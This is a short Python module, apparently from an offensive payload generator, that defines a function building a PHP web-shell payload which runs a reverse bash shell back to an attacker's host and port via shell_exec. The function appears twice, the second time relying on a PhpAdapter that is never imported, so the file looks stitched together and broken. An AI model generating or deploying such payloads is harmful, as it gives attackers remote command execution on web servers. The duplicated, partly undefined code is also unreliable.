__all__ = ['reverse_bash']

from ...cmd.unix import reverse_bash as bash_cmd
from ...util import kwdefaults_from


@kwdefaults_from(bash_cmd)
def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
    from .. import php_adapter

    return php_adapter(
        "<pre><?= shell_exec({!p}) ?></pre>", bash_cmd(lhost, lport, **kwargs)
    )

_php_adapter = PhpAdapter().format


@kwdefaults_from(bash_cmd)
def reverse_bash(lhost: str, lport: int, **kwargs) -> str:
    return _php_adapter(
        "<pre><?= shell_exec({}) ?></pre>", bash_cmd(lhost, lport, **kwargs)
    )
